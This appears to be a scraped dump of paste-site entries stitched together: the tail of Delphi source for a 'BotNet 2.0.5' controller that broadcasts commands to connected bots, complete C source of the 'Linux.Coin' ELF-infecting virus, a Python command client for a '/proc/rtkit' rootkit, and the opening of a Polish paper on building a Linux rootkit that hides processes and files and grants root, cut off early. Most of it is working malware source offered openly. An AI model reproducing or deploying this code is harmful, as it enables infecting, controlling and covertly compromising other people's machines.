       P := ListView1.Items[i].Data;
       If PBotData(P)^.SockID = SockId Then
       Begin
         PBotData(P)^.Connection := Connection;
         Break;
       End;
     End;
   End;

   Procedure TForm1.SetNick(SockId: Integer; Nick: String);
   Var
     I: Integer;
     P: Pointer;
   Begin
     For I := 0 To ListView1.Items.Count -1 Do
     Begin
       P := ListView1.Items[i].Data;
       If PBotData(P)^.SockID = SockId Then
       Begin
         PBotData(P)^.NickName := Nick;
         ListView1.Items[i].Caption := Nick;
         Break;
       End;
     End;
   End;

   Procedure TForm1.AddBot(IP: String; SockId: Integer; p1,p2,p3,p4: String);
   Var
     Item: TListItem;
     P   : Pointer;
     I   : Integer;
   Begin
     Item := ListView1.Items.Add;
     Item.Caption := p1;
     BotData.NickName := p1;
     BotData.Ident := p2;
     BotData.SockID := SockID;
     BotData.IP := IP;
     Item.SubItems.Add('');
     Item.Data := @BotData;
     Memo1.Lines.Add('** JOIN ('+p1+')');
   End;

   Procedure TForm1.GetParams(CS: Integer; Data: String);
   Var
     Tmp: String;
   Begin
     Case CS Of
       0: cN := 0;
       1: sN := 0;
     End;

     Case CS Of
       0: ZeroMemory(@ClientP, SizeOf(ClientP));
       1: ZeroMemory(@serverP, SizeOf(serverP));
     End;

     Data := Trim(Data) + ' ';
     While Pos(' ', Data) > 0 Do
     Begin
       Case CS Of
         0: ClientP[cN] := Copy(Data, 1, Pos(' ', Data)-1);
         1: serverP[sN] := Copy(Data, 1, Pos(' ', Data)-1);
       End;
       Data := Copy(Data, Pos(' ', Data)+1, Length(Data));
       inc(cn);
       inc(sn);
     End;
   End;

   procedure TForm1.Timer1Timer(Sender: TObject);
   var
     text:string;
     i:integer;
   begin
     text := TMPTEXT;
     If Text <> '' Then
       Memo1.Text := Memo1.Text + Text[1]
     Else
       Timer1.Enabled := False;
     inc(timerCount);
     delete(tmpText,1,1);
   end;

   procedure TForm1.FormCreate(Sender: TObject);
   begin
     tmpText := 'Thanks for using BotNet 2.0.5'#13#10'Please visit http://p0ke.no-ip.com';
     timerCount := 0;
     memo1.text := '';
   end;

   procedure TForm1.ListView1Resize(Sender: TObject);
   begin
     ListView1.Column[0].Width := ListView1.Width - 60;
     ListView1.Column[1].Width := 50;
   end;

   procedure TForm1.FormResize(Sender: TObject);
   begin
     If Splitter1.Left > 50 Then
     Begin
       If Splitter1.Left > (Panel1.Width - 46) Then
         PageControl1.Width := Panel1.Width - 40;
     End;
   end;

   procedure TForm1.Exit1Click(Sender: TObject);
   begin
     ExitProcess(0);
   end;

   FUNCTION getip(HostName:STRING) : STRING;
   LABEL Abort;
   TYPE
     TAPInAddr = ARRAY[0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
     I          : Integer;
   BEGIN
     Result:='';
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(PChar(HostName));
       IF HostEntPtr=NIL THEN GOTO Abort;
       pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
       I:=0;
       WHILE pptr^[I]<>NIL DO BEGIN
         IF HostName='' THEN BEGIN
           IF(Pos('169',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
             Result:=inet_ntoa(pptr^[I]^);
             GOTO Abort;
           END;
         END ELSE
         RESULT:=(inet_ntoa(pptr^[I]^));
         Inc(I);
       END;
       Abort:
     EXCEPT
     END;
     WSACleanUp();
   END;

   procedure TForm1.Button2Click(Sender: TObject);
   begin
     If Button2.Caption = '&Connect' Then
     Begin
       ClientSocket1.Port := StrToInt(Edit2.Text);
       ClientSocket1.Address := getip(Edit1.Text);
       ClientSocket1.Active := True;
       Button2.Caption := '&Disconnect';
       Exit;
     End;

     If Button2.Caption = '&Disconnect' Then
     Begin
       If ClientSocket1.Active Then
       If MessageBox(0,'Are you sure you want to break your current'#13#10+
                     'connection?', 'Warning!', mb_yesno) = id_no Then
         Exit;
       Button2.Caption := '&Connect';
       ClientSocket1.Active := False;
       ListView1.Items.Clear;
       Exit;
     End;
   end;

   procedure TForm1.ClientSocket1Error(Sender: TObject;
     Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
     var ErrorCode: Integer);
   begin
     Label4.Caption := 'Client error #'+IntToStr(ErrorCode);
     Memo1.Lines.Add('## Error: #'+IntToStr(Errorcode));
     ErrorCode := 0;
     If ClientSocket1.Active = False Then
       Button2.Caption := '&Connect';
   end;

   procedure TForm1.ClientSocket1Connect(Sender: TObject;
     Socket: TCustomWinSocket);
   begin
     Memo1.Lines.Add('## Connected To '+edit1.text+':'+edit2.text);
     Label4.Caption := 'Client connected';
     If Not bGate.Checked Then
     Begin
       Memo1.Lines.Add('## Sending USER');
       Socket.SendText('USER '+Edit3.Text+' '+Edit3.Text+'@'+Edit3.Text+' ""win2k"" :'+Edit3.Text+#10);
       Memo1.Lines.Add('## Sending NICK');
       Socket.SendText('NICK '+Edit3.Text+#10);
     End;
   end;

   procedure TForm1.ClientSocket1Connecting(Sender: TObject;
     Socket: TCustomWinSocket);
   begin
     Memo1.Lines.Add('## Connecting To '+edit1.text+':'+edit2.text);
     Label4.Caption := 'Client connecting';
   end;

   procedure TForm1.ClientSocket1Disconnect(Sender: TObject;
     Socket: TCustomWinSocket);
   begin
     Memo1.Lines.Add('## Disconnected From '+edit1.text+':'+edit2.text);
     Button2.Caption := '&Connect';
     Label4.Caption := 'Client disconnected';
   end;

   procedure TForm1.ClientSocket1Read(Sender: TObject;
     Socket: TCustomWinSocket);
   var
     data: String;
     tmp : String;
     Nick: String;
     Msg : String;
     IP  : String;
     Sock: Integer;
     I   : Integer;
   begin
     data := socket.ReceiveText;
     Label4.caption := 'Received '+inttostr(length(data))+' bytes';

     While Data <> '' Do
     Begin
       Tmp := Copy(Data, 1, Pos(#10, Data)-1);
       If Tmp[Length(Tmp)] = #13 Then Delete(Tmp, Length(Tmp), 1);

       Data := Copy(Data, Pos(#10, Data)+1, Length(Data));

       If Not bGate.Checked Then
       Begin
         GetParams(0, Tmp);

   {
         353 p0key @ #swevx :p0key NexusC e1f madman threepio CriTiX
   }

         If UpperCase(ClientP[1]) = '353' Then
         Begin
           Delete(Tmp, 1, 1);
           Tmp := Copy(Tmp, Pos(':', Tmp)+1, Length(Tmp));
           GetParams(0, Tmp);
           For i := 0 To cN -1 Do Begin
             Randomize;
             AddBot('?.?.?.?', Random(99999), ClientP[I],ClientP[I]+'_',ClientP[I]+'|',ClientP[I]+'-');
             Sleep(100);
           End;
         End;

         If pos('PING :', Tmp)> 0 Then
         Begin
           Memo1.Lines.Add('## Got Ping? Suck Pong!');
           Msg := Copy(Tmp, Pos('PING :', Tmp), Length(Tmp));
           Delete(Msg, 2, 1);
           Insert('O', Msg, 2);
           Socket.SendText(Msg+#10);
         End;

         If Pos('MOTD', Tmp) > 0 Then
         Begin
           Memo1.Lines.Add('## Found MOTD: Time To Join Chan');
           Socket.SendText('MODE '+Form2.Edit6.Text+#10);
           Socket.SendText('JOIN '+Form2.Edit6.Text+#10);
         End;

         If UpperCase(ClientP[1]) = 'PRIVMSG' Then
         Begin
           Nick := Copy(ClientP[0], 2, Pos('!', ClientP[0])-2);
           Tmp := Copy(Tmp, Pos(ClientP[2], Tmp)+Length(ClientP[2])+2, Length(Tmp));
           Memo1.Lines.Add(Nick+': '+Tmp);
         End;

       End Else Begin
         IP := Copy(Tmp, 1, Pos(' ', Tmp)-1);
         Tmp := Copy(Tmp, pos(' ', Tmp)+1, Length(Tmp));
         SOCK := StrToInt(Copy(Tmp, 1, Pos(' ', Tmp)-1));
         Tmp := Copy(Tmp, pos(' ', Tmp)+1, Length(Tmp));

         getparams(0, tmp);

         If UpperCase(ClientP[0]) = 'QUIT' Then QuitBot(Sock);
         If UpperCase(ClientP[0]) = 'NICK' Then SetNick(Sock, ClientP[1]);
         If UpperCase(ClientP[0]) = 'USER' Then AddBot(IP, Sock, ClientP[1],
                                                     ClientP[2], ClientP[3], ClientP[4]);
         If UpperCase(ClientP[0]) = 'CONNECTION' Then SetConnection(Sock, ClientP[1]);
         If UpperCase(ClientP[0]) = 'OSTYPE' Then SetOS(Sock, ClientP[1]);
         If UpperCase(ClientP[1]) = 'PRIVMSG' Then
         Begin
           Nick := ClientP[0];
           Nick := Copy(Nick, 1, Pos('!', Nick)-1);
           Msg := Copy(Tmp, Pos(' :', Tmp)+2, Length(Tmp));
           Memo1.Lines.Add(Nick+': '+Msg);
         End;
       End;

     End;

   end;

   procedure TForm1.ListView1Click(Sender: TObject);
   Var
     p: Pointer;
     i: Integer;
   begin
     Memo3.Clear;
     If ListView1.ItemIndex = -1 Then Exit;

     Memo3.Lines.Add('Looking up '+ListView1.ItemFocused.Caption+'...');
     memo3.lines.add('');
     memo3.lines.add('');

     P := ListView1.ItemFocused.Data;

     memo3.lines.add('Nickname: '+ PBotData(P)^.NickName);
     memo3.lines.add('Ident: '+ PBotData(P)^.Ident);
     memo3.lines.add('IP Address: '+ PBotData(P)^.IP);
     memo3.lines.add('OS Type: '+ PBotData(P)^.OS);
     memo3.lines.add('Connection: '+ PBotData(P)^.Connection);
     memo3.lines.add('SocketID: '+ IntToStr(PBotData(P)^.SockID));
     memo3.lines.add('');
     memo3.lines.add('End of info.');
   end;

   procedure TForm1.ServerSocket1ClientRead(Sender: TObject;
     Socket: TCustomWinSocket);
   var
     data: String;
     tmp : String;
     Nick: String;
     Msg : String;
     IP  : String;
     Sock: Integer;
   begin
     data := socket.ReceiveText;
     Label4.caption := 'Received '+inttostr(length(data))+' bytes';

     While Data <> '' Do
     Begin
       Tmp := Copy(Data, 1, Pos(#10, Data)-1);
       If Tmp[Length(Tmp)] = #13 Then Delete(Tmp, Length(Tmp), 1);

       Data := Copy(Data, Pos(#10, Data)+1, Length(Data));

       IP := Socket.RemoteAddress;
       SOCK := Socket.SocketHandle;

       getparams(1, tmp);

       If UpperCase(ServerP[0]) = 'QUIT' Then QuitBot(Sock);
       If UpperCase(ServerP[0]) = 'NICK' Then SetNick(Sock, ServerP[1]);
       If UpperCase(ServerP[0]) = 'USER' Then
       Begin
         tmp := connection_begin;
         replacestr('%server_name%', server_name, tmp);
         replacestr('%param1%', ServerP[1], tmp);
         replacestr('%param2%', ServerP[2], tmp);
         replacestr('%param3%', ServerP[3], tmp);
         replacestr('%param4%', ServerP[4], tmp);
         replacestr('%channel%', server_chan, tmp);
         ReplaceStr('""', '', Tmp);
         Socket.SendText(tmp);
         with form2 do
         begin
           case radiogroup1.ItemIndex of
             0:DoConnection(0, Tmp, ServerP[1], ServerP[2], ServerP[3], ServerP[4]);
             1:DoConnection(1, Tmp, ServerP[1], ServerP[2], ServerP[3], ServerP[4]);
             2:DoConnection(2, Tmp, ServerP[1], ServerP[2], ServerP[3], ServerP[4]);
           end;
         end;
         Socket.SendText(Tmp);
         Tmp := connection_end;
         ReplaceStr('%server_name%', server_name, Tmp);
         ReplaceStr('%param1%', ServerP[1], Tmp);
         ReplaceStr('%channel%', server_chan, Tmp);
         ReplaceStr('%topic%', server_topic, Tmp);
         Socket.SendText(Tmp);
         If Form2.CheckBox3.Checked Then
           AddBot(Form2.Edit4.Text, Sock, ServerP[1], ServerP[2], ServerP[3], ServerP[4])
         Else
           AddBot(IP, Sock, ServerP[1], ServerP[2], ServerP[3], ServerP[4]);
       End;
       If UpperCase(ServerP[0]) = 'CONNECTION' Then SetConnection(Sock, ServerP[1]);
       If UpperCase(ServerP[0]) = 'OSTYPE' Then SetOS(Sock, ServerP[1]);
       If UpperCase(ServerP[0]) = 'PRIVMSG' Then
       Begin
         Tmp := GetUserNick(Socket.SocketHandle) + Tmp;
         getparams(1, tmp);
         Nick := ServerP[0];
         Nick := Copy(Nick, 1, Pos('!', Nick)-1);
         Msg := Copy(Tmp, Pos(' :', Tmp)+2, Length(Tmp));
         Memo1.Lines.Add(Nick+': '+Msg);
       End;

     End;
   end;

   procedure TForm1.Start1Click(Sender: TObject);
   begin
     if button2.caption = '&Connect' Then Button2.click;
   end;

   procedure TForm1.Stop1Click(Sender: TObject);
   begin
     if button2.caption = '&Disconnect' Then Button2.click;
   end;

   procedure TForm1.Start2Click(Sender: TObject);
   begin
     If ServerSocket1.Active Then Exit;
     If ClientSocket1.Active Then
       If MessageBox(0,'Are you sure you want to break your current connection?', 'Warning', mb_yesno) = ID_NO Then Exit;
     Button2.Enabled := False;
     ServerSocket1.Active := True;
   end;

   procedure TForm1.Stop2Click(Sender: TObject);
   begin
     If Not ServerSocket1.Active Then Exit;
     Button2.Enabled := True;
     ServerSocket1.Active := False;
   end;

   procedure TForm1.ServerSocket1ClientConnect(Sender: TObject;
     Socket: TCustomWinSocket);
   begin
     Label4.Caption := 'Server accepted connection';
     Memo1.Lines.Add('## '+Socket.LocalAddress +' Connected');
   end;

   procedure TForm1.ServerSocket1Listen(Sender: TObject;
     Socket: TCustomWinSocket);
   begin
     Label4.Caption := 'Server online';
     Memo1.Lines.Add('## Server online');
   end;

   procedure TForm1.ServerSocket1ClientError(Sender: TObject;
     Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
     var ErrorCode: Integer);
   begin
     Label4.Caption := 'Server error #'+IntToStr(ErrorCode);
     Memo1.Lines.Add('## Server error #'+IntToStr(ErrorCode));
     ErrorCode:=0;
   end;

   procedure TForm1.Config1Click(Sender: TObject);
   begin
     Form2.Show;
   end;

   procedure TForm1.Timer2Timer(Sender: TObject);
   begin
     Timer2.Enabled := False;
     form2.loadsettings('default.bn5');
     With Form2 Do
     Begin
       server_name := Edit3.Text;
       server_host := Edit4.Text;
       server_topic:= Edit5.Text;
       server_chan := Edit6.Text;
     End;
   end;

   procedure TForm1.Button3Click(Sender: TObject);
   var
     I: Integer;
     J: Integer;
     P: Pointer;
   begin
     If RadioButton1.Checked Then
     Begin
       If Form2.CheckBox1.Checked Then
         Memo1.Lines.Add(Copy(Form2.Edit2.Text,1,pos('!',Form2.Edit2.Text)-1)+': '+Memo2.Text)
       Else
         Memo1.Lines.Add('You: '+Memo2.Text);
       If CheckBox1.Checked Then
       Begin
         If ServerSocket1.Active Then
           For I := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
             ServerSocket1.Socket.Connections[i].SendText(memo2.Text+#10);
         If ClientSocket1.Active Then
           ClientSocket1.Socket.SendText(memo2.text+#10);
       End Else
       Begin
         If ServerSocket1.Active Then
           For I := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
             If Form2.CheckBox1.Checked Then
               ServerSocket1.Socket.Connections[i].SendText(
               ':'+Form2.Edit2.Text + ' PRIVMSG '+Form2.Edit6.Text+' :'+memo2.Text+#10)
             Else
               ServerSocket1.Socket.Connections[i].SendText(
               ':admin!admin@127.0.0.1 PRIVMSG '+Form2.Edit6.Text+' :'+memo2.Text+#10);
         If ClientSocket1.Active Then
           If Form2.CheckBox1.Checked Then
             ClientSocket1.Socket.SendText('PRIVMSG '+Form2.Edit6.Text+' :'+memo2.Text+#10)
           Else
             ClientSocket1.Socket.SendText('PRIVMSG '+Form2.Edit6.Text+' :'+memo2.Text+#10);
       End;
     End Else
     Begin
       Case ComboBox1.ItemIndex Of
         0:Begin
             // Selected Bots Only.
             For I := 0 To ListView1.Items.Count -1 Do
             Begin
               If ListView1.Items[i].Selected Then
                 If ServerSocket1.Active Then
                 Begin
                   P := ListView1.Items[i].Data;
                   For J := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
                   Begin
                     If ServerSocket1.Socket.Connections[i].SocketHandle = PBotData(P)^.SockID Then
                       If Form2.CheckBox1.Checked Then
                         ServerSocket1.Socket.Connections[i].SendText(':'+Form2.Edit2.Text + ' PRIVMSG '+PBotData(P)^.NickName+' :'+memo2.Text+#10)
                       Else
                         ServerSocket1.Socket.Connections[i].SendText(':admin!admin@127.0.0.1 PRIVMSG '+PBotData(P)^.NickName+' :'+memo2.Text+#10);
                   End;
                 End;
                 If ClientSocket1.Active Then
                 Begin
                   P := ListView1.Items[i].Data;
                   If Form2.CheckBox1.Checked Then
                     ClientSocket1.Socket.SendText('PRIVMSG '+
                     PBotData(P)^.NickName +' :'+memo2.Text+#10)
                   Else
                     ClientSocket1.Socket.SendText('PRIVMSG '+
                     PBotData(P)^.NickName +' :'+memo2.Text+#10);
                 End;
             End;
           End;
         1:Begin
             // Bots Start With
             For I := 0 To ListView1.Items.Count -1 Do
             Begin
               If Copy(ListView1.Items[i].Caption, 1, Length(Edit4.Text)) = Edit4.Text Then
                 If ServerSocket1.Active Then
                 Begin
                   P := ListView1.Items[i].Data;
                   For J := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
                   Begin
                     If ServerSocket1.Socket.Connections[i].SocketHandle = PBotData(P)^.SockID Then
                       If Form2.CheckBox1.Checked Then
                         ServerSocket1.Socket.Connections[i].SendText(':'+Form2.Edit2.Text + ' PRIVMSG '+PBotData(P)^.NickName+' :'+memo2.Text+#10)
                       Else
                         ServerSocket1.Socket.Connections[i].SendText(':admin!admin@127.0.0.1 PRIVMSG '+PBotData(P)^.NickName+' :'+memo2.Text+#10);
                   End;
                 End;
                 If ClientSocket1.Active Then
                 Begin
                   P := ListView1.Items[i].Data;
                   If Form2.CheckBox1.Checked Then
                     ClientSocket1.Socket.SendText('PRIVMSG '+
                     PBotData(P)^.NickName +' :'+memo2.Text+#10)
                   Else
                     ClientSocket1.Socket.SendText('PRIVMSG '+
                     PBotData(P)^.NickName +' :'+memo2.Text+#10);
                 End;
             End;
           End;
         2:Begin
             // Bots Contain
             For I := 0 To ListView1.Items.Count -1 Do
             Begin
               If Pos(Edit4.Text, ListView1.Items[i].Caption) > 0 Then
                 If ServerSocket1.Active Then
                 Begin
                   P := ListView1.Items[i].Data;
                   For J := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
                   Begin
                     If ServerSocket1.Socket.Connections[i].SocketHandle = PBotData(P)^.SockID Then
                       If Form2.CheckBox1.Checked Then
                         ServerSocket1.Socket.Connections[i].SendText(':'+Form2.Edit2.Text + ' PRIVMSG '+PBotData(P)^.NickName+' :'+memo2.Text+#10)
                       Else
                         ServerSocket1.Socket.Connections[i].SendText(':admin!admin@127.0.0.1 PRIVMSG '+PBotData(P)^.NickName+' :'+memo2.Text+#10);
                   End;
                 End;
                 If ClientSocket1.Active Then
                 Begin
                   P := ListView1.Items[i].Data;
                   If Form2.CheckBox1.Checked Then
                     ClientSocket1.Socket.SendText('PRIVMSG '+
                     PBotData(P)^.NickName +' :'+memo2.Text+#10)
                   Else
                     ClientSocket1.Socket.SendText('PRIVMSG '+
                     PBotData(P)^.NickName +' :'+memo2.Text+#10);
                 End;
             End;
           End;
         3:Begin
             // Bots Ends With
             For I := 0 To ListView1.Items.Count -1 Do
             Begin
               If Copy(ListView1.Items[i].Caption, Length(ListView1.Items[i].Caption)-Length(Edit4.Text), Length(Edit4.Text)) = Edit4.Text Then
                 If ServerSocket1.Active Then
                 Begin
                   P := ListView1.Items[i].Data;
                   For J := 0 To ServerSocket1.Socket.ActiveConnections -1 Do
                   Begin
                     If ServerSocket1.Socket.Connections[i].SocketHandle = PBotData(P)^.SockID Then
                       If Form2.CheckBox1.Checked Then
                         ServerSocket1.Socket.Connections[i].SendText(':'+Form2.Edit2.Text + ' PRIVMSG '+PBotData(P)^.NickName+' :'+memo2.Text+#10)
                       Else
                         ServerSocket1.Socket.Connections[i].SendText(':admin!admin@127.0.0.1 PRIVMSG '+PBotData(P)^.NickName+' :'+memo2.Text+#10);
                   End;
                 End;
                 If ClientSocket1.Active Then
                 Begin
                   P := ListView1.Items[i].Data;
                   If Form2.CheckBox1.Checked Then
                     ClientSocket1.Socket.SendText('PRIVMSG '+
                     PBotData(P)^.NickName +' :'+memo2.Text+#10)
                   Else
                     ClientSocket1.Socket.SendText('PRIVMSG '+
                     PBotData(P)^.NickName +' :'+memo2.Text+#10);
                 End;
             End;
           End;
       End;
     End;
     Memo2.Text := '';
   end;

   end."
bmbgC4tW,Linux.Coin - Malware - Source Code,FlyFar,C,Wednesday 7th of June 2023 05:44:16 AM CDT,"   /* Linux.Coin (x) herm1t@vx.netlux.org, feb 2008 */
   /* 2008-07-25 fixed */
   /* 2008-05-05 gain control via .dtors */
   #include <stdint.h>
   #include <elf.h>
   #include <sys/mman.h>
   #include <asm/unistd.h>

   asm("".globl _start"");
   asm(""fake_host: mov $1,%eax; int $0x80"");
   asm(""_start: push $fake_host; call caveat; ret"");

   #define NULL        ((void*)0)
   #define ASM     asm volatile
   #define _SC(r,NR)   ""push %1\npop %%eax\nint $0x80"":""=a""(r):""i""(NR)
   #define syscall0(NR)            \
   ({int r;ASM(_SC(r,NR));r; })
   #define syscall1(NR,a)          \
   ({int r;ASM(_SC(r,NR),""b""((int)(a)));r;})
   #define syscall2(NR,a,b)        \
   ({int r;ASM(_SC(r,NR),""b""((int)(a)),""c""((int)(b)));r;})
   #define syscall3(NR,a,b,c)      \
   ({int r;ASM(_SC(r,NR),""b""((int)(a)),""c""((int)(b)),""d""((int)(c)));r;})

   #define syscall4(NR,a,b,c,d)        \
   ({int r;ASM(_SC(r,NR),""b""((int)(a)),""c""((int)(b)),""d""((int)(c)),""S""((int)(d)));r;})

   #define syscall6(NR,a,b,c,d,e,f)    \
   ({int r;ASM(""push %%ebp\nmovl %%eax,%%ebp\nmov %1,%%eax\nint $0x80\npop %%ebp""  \
           :""=a""(r):""i""(NR),""b""((int)(a)), \
       ""c""((int)(b)),""d""((int)(c)),""S""((int)(d)),""D""((int)(e)),""0""((int)(f)));r;})
   #define exit(a)         syscall1(1,  a)
   #define read(a,b,c)     syscall3(3,  a,b,c)
   #define write(a,b,c)        syscall3(4,  a,b,c)
   #define open(a,b)       syscall2(5,  a,b)
   #define close(a)        syscall1(6,  a)
   #define creat(a,b)      syscall2(8,  a,b)
   #define time(a)         syscall1(13, a)
   #define lseek(a,b,c)        syscall3(19, a,b,c)
   #define rename(a,b)     syscall2(38, a,b)
   #define readdir(a,b)        syscall2(89, a,b)
   #define munmap(a,b)     syscall2(91, a,b)
   #define ftruncate(a,b)      syscall2(93, a,b)
   #define mprotect(a,b,c)     syscall3(125,a,b,c)
   #define mremap(a,b,c,d)     syscall4(163,a,b,c,d)
   #define mmap(a,b,c,d,e,f)   syscall6(192,a,b,c,d,e,f)

   static void inline memcpy(void *dst, void *src, int len)
   {
       int i;
       for (i = 0; i < len; i++)
           *(char*)dst++ = *(char*)src++;
   }

   static void inline memmove(void *dst_void, void *src_void, int len)
   {
       char *dst = dst_void;
       char *src = src_void;
       if (src < dst && dst < src + len) {
           src += len;
           dst += len;
           while (len--)
               *--dst = *--src;
       } else {
           while (len--)
               *dst++ = *src++;
       }
   }

   static int inline strcmp(char *s1, char *s2)
   {
       while (*s1 != 0 && *s1 == *s2)
           s1++, s2++;
       if (*s1 == 0 || *s2 == 0)
           return (unsigned char) *s1 - (unsigned char) *s2;
       return *s1 - *s2;
   }

   static void infect(char *filename, char *self)
   {
       int h, l, i, ok, size;
       uint8_t *m;
       Elf32_Ehdr *ehdr;
       Elf32_Phdr *phdr;
   extern int _start;
   extern int virus_end;
       size = (char*)&virus_end - (char*)&_start;

       if ((h = open(filename, 2)) < 0)
           return;
       if ((l = lseek(h, 0, 2)) < 0)
           goto error1;
       m = (char*)mmap(NULL, l, PROT_READ|PROT_WRITE, MAP_SHARED, h, 0);
       if ((uint32_t)m > 0xfffff000)
           goto error1;

       ehdr = (Elf32_Ehdr*)m;
       if (*(uint32_t*)ehdr->e_ident != 0x464c457f ||
       ehdr->e_type != ET_EXEC ||
       ehdr->e_machine != EM_386 ||
       ehdr->e_version != EV_CURRENT ||
       ehdr->e_ident[EI_OSABI] != ELFOSABI_NONE) {
   error2:     munmap(m, l);
   error1:     close(h);
           return;
       }
       /* find loadable segments and check 'em */
       phdr = (Elf32_Phdr*)(m + ehdr->e_phoff);
           for (ok = 0, i = 0; i < ehdr->e_phnum; i++)
                   if (phdr[i].p_type == PT_LOAD && phdr[i].p_offset == 0 &&
              (i + 1) < ehdr->e_phnum && phdr[i + 1].p_type == PT_LOAD) {
                           if (phdr[i].p_filesz != phdr[i].p_memsz)
                                   break;
                           ok++;
                           break;
                   }
       if (! ok)
           goto error2;
       uint32_t dp, tp, ve, vo;
           vo = phdr[i].p_filesz;
           ve = phdr[i].p_vaddr + phdr[i].p_filesz;
           tp = 4096 - (phdr[i].p_filesz & 4095);
           dp = phdr[i + 1].p_vaddr - (phdr[i + 1].p_vaddr & ~4095);
       if (tp + dp < size || tp == 0x1000 || phdr[i+1].p_filesz == 0)
           goto error2;

       /* update program headers */
       phdr[i].p_memsz += tp;
           phdr[i].p_filesz += tp;
       if (dp != 0) {
               phdr[i+1].p_vaddr -= dp;
               phdr[i+1].p_paddr -= dp;
               phdr[i+1].p_offset += tp;
               phdr[i+1].p_filesz += dp;
               phdr[i+1].p_memsz += dp;
           /* PHT */
           for (i = i + 2; i < ehdr->e_phnum; i++)
               if (phdr[i].p_offset >= vo)
                   phdr[i].p_offset += tp + dp;
           /* make hole */
               ftruncate(h, l + tp + dp);
               m = (char*)mremap(m, l, l + tp + dp, 1 /*MREMAP_MAYMOVE*/);
           if ((uint32_t)m > 0xfffff000)
               goto error1;
               memmove(m + vo + tp + dp, m + vo, l - vo);
           ehdr = (Elf32_Ehdr*)m;
       }

       /* update section headers and patch .dtors/.jcr */
           if (dp != 0 && ehdr->e_shoff >= vo)
                   ehdr->e_shoff += (tp + dp);
       Elf32_Shdr *shdr = (Elf32_Shdr*)(m + ehdr->e_shoff);
       char *strtab = m + shdr[ehdr->e_shstrndx].sh_offset;
       char dtors[] = { '.', 'd', 't', 'o', 'r', 's' };
           for (i = 1; i < ehdr->e_shnum; i++, shdr++) {
                   if (dp !=0 && shdr->sh_offset >= vo)
                           shdr->sh_offset += (tp + dp);
           if (! strcmp(strtab + shdr->sh_name, dtors)) {
               uint32_t *t;
               t = (uint32_t*)(m + shdr->sh_offset + shdr->sh_size - 4);
               if (t[0] == 0 && t[1] == 0) {
                   memcpy(m + vo, self, size);
                   *t = ve;
               }
           }
       }
       goto error2;
   }

   static void __attribute__((used)) caveat(void)
   {
       char dot[] = { '.', '\0' };
       char d[256];
       int h;
       char *self = __builtin_return_address(0) - 5;
       if ((h = open(dot, 0)) > 0)
           while (readdir(h, d) > 0)
               infect(d + 10, self);
       close(h);

   }

   asm(""virus_end:"");"
7zqaePYg,rtcmd.py,FlyFar,Python,Wednesday 7th of June 2023 05:42:07 AM CDT,"#!/usr/bin/env python
import sys
import os

def order(command):
    f = open(""/proc/rtkit"", ""w"")
    f.write(command)
    f.close()

if len(sys.argv) > 1:
    order(sys.argv[1])

if len(sys.argv) > 2:
    os.execl(sys.argv[2], """")"
rTx5rLzT,polis_paper.tex,FlyFar,BibTeX,Wednesday 7th of June 2023 05:41:27 AM CDT,"\documentclass[a4paper]{article}
\usepackage[utf8x]{inputenc}
\usepackage[T1]{fontenc}
\usepackage[polish]{babel}
\usepackage{minted}
\begin{document}
\title{Prosta, wysokopoziomowa implementacja rootkita dla Linuksa.}
\author{Arkadiusz ,,Ivyl'' Hiler \and Michał ,,t3hknr'' Winiarski}
\date{Styczeń 2012}
\maketitle
\newpage
\begin{abstract}
Opis metod i technik użytych przy implementacji modułu jądra umożliwającego intruzowi utrzymanie kontroli nad systemem
oraz ukrycie swoich działań.

Moduł umożliwia uzyskanie praw roota oraz ukrycie plików, procesów oraz samego siebie. 
Wydawanie rozkazów jak i sprawdzanie stanu rootkita odbywa sie za pomocą ukrytego wpisu w \texttt{/proc}.

Pełen kod rootkita został zamieszony na końcu ninejszego dokumenu oraz na
\texttt{https://github.com/ivyl/rootkit}
\end{abstract}

\newpage
\tableofcontents
\newpage

\section{Wstęp}
\subsection{Metody zdobywania wiedzy}
Podstawowy opis struktur \texttt{file} i \texttt{file\_operations}, techniki
debugowania, czy budowy i uruchamiania modułów można znaleźć w ,,Linux Device
Drivers''\cite{ldd3}. Następny w kolejności źródłem infromacji jest sam kod
źródłowy kernela. Poszukiwanie funkcji najlepiej zacząć od przeszukania plików
nagłówkowych zawierających ich deklaracje (katalog \texttt{include/}). Łatwo
można skonstruować wyrażenia regularne szukające prototypu zwracającego
interesujący nas typ i zawierającego interesujące nas słowo. Szukania
przykładowego użycia można dokonać w pozostałych katalogach, zawierających
sterowniki i samą implementację. Do przeglądania zagadnień najlepiej nadaje
się dokumentacja jądra (\texttt{Documentation/}). W dokumencie ograniczymy się
do pobieżnej analizy potrzebnych nam funkcji i struktur, pomijając nieistotne
pola. Zachęcamy do pełnej samodzielnej analizy plików nagłówkowych.


\subsection{Środowisko}
Moduł zbudowany w oparciu o przedstawione techniki z powodzeniem był
kompilowany oraz działa na jądrze 3.1.0 oraz 3.1.5. Użyto gcc w wersji 4.6.x.
Nie powinno być jednak problemu z innymi wersjami gcc jak i jądrami w wersji
większej lub równej od 2.6.26 (wcześniej nie była eksportowana funkcja
\texttt{lookup\_address}). Testy przeprowadzono zarówno na jądrze
skompilowanym pod architekturzę x86 jak i x86\_64.


\section{Makefile}
Użyliśmy standardowgo pliku \texttt{Makefile} opisanego w LDD\cite{ldd3}:
\begin{minted}[frame=lines,framesep=2mm]{makefile}
ifneq ($(KERNELRELEASE),)
	obj-m := rt.o
else
	KERNELDIR ?= /lib/modules/$(shell uname -r)/build
	PWD := $(shell pwd)

default:
	$(MAKE) -C $(KERNELDIR) M=$(PWD) modules

endif
\end{minted}
Wykonanie polecenia make powoduje samodzielnie ustawienie środowiska do
budowania na podstawie symlinku build w katalogu zawierającym moduły aktualnie
używanego jądra.


\section{Właściwa implementacja}
\subsection{Struktura modułu}
Stworzenie nowego modułu wymaga oznaczenia dwóch funkcji za pomocą makr 
